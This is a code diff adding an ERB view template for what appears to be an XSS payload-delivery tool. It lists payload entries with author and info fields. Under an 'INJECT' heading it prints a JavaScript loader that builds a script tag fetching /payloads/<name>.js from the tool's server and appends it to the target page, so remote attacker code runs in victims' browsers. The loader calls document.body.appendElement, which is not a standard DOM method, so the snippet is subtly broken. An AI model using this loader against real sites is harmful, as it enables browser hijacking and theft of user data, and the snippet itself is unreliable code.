@@ -1,0 +1,32 @@
+<% @entries.each_with_index do |entry, i| %>
+<div class="entry <% if i == 0 %>expanded<% else %>collapsed<% end %>">
+	<div class="titlebar">
+		<a class="toggle" href="#"><span>collapse</span></a>
+		<span class="title"><%= entry[:title] %></span>
+	</div>
+	<table class="details">
+		<% if !entry[:author].empty? %>
+		<tr>
+			<th><span>AUTHOR</span></th>
+			<td class="longwrap"><%= entry[:author] %></td>
+		</tr>
+		<% end %>
+		<% if !entry[:description].empty? %>
+		<tr>
+			<th><span>INFO</span></th>
+			<td><%= entry[:description] %></td>
+		</tr>
+		<% end %>
+		<tr>
+			<th><span>INJECT</span></th>
+			<td class="longwrap">
+				<div class="injection">
+					var x = document.createElement('script');
+					x.src = '<%= request.scheme %>://<%= request.host %>:<%= request.port %>/payloads/<%= entry[:shortname] %>.js';
+					document.body.appendElement(x);
+				</div>
+			</td>
+		</tr>
+	</table>
+</div>
+<% end %>
